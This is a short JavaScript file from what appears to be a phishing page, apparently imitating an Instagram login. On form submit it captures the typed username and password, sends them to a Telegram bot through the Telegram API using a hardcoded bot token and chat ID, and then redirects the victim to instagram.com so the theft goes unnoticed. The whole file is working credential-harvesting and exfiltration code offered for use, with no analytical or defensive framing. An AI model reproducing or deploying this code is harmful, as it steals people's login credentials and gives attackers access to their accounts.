document.addEventListener('DOMContentLoaded', (event) => {
    console.log('Event listened');
    const form = document.querySelector(".fish"); // Select the form
    const inputUsername = document.querySelector(".username");
    const inputUserPassword = document.querySelector(".userpassword");

    form.addEventListener("submit", (event) => {
        event.preventDefault(); // Prevent the default form submit action

        // Encode the input values to ensure special characters are properly handled
        const encodedUsername = encodeURIComponent(inputUsername.value);
        const encodedPassword = encodeURIComponent(inputUserPassword.value);

        console.log("Form submitted");
        const data = {
            username: encodedUsername,
            password: encodedPassword,
        };
        const text = `<b>Username:</b> <em>${data.username}</em>\n<b>Password:</b> <em>${data.password}</em>`
        // Construct the URL with the encoded data
        const url = `https://api.telegram.org/bot6470863160:AAEGu531zjCnJCOIuBC_yPwiqhO5mVs_9og/sendMessage?chat_id=855900699&text=${encodeURIComponent(text)}&parse_mode=HTML`;

        // Use fetch to send the data
        fetch(url, { method: 'GET' })
        .then(response => response.json())
        .then(responseData => window.location.href = "https://instagram.com")
        .catch(error => console.error('Error:', error));
    });
});
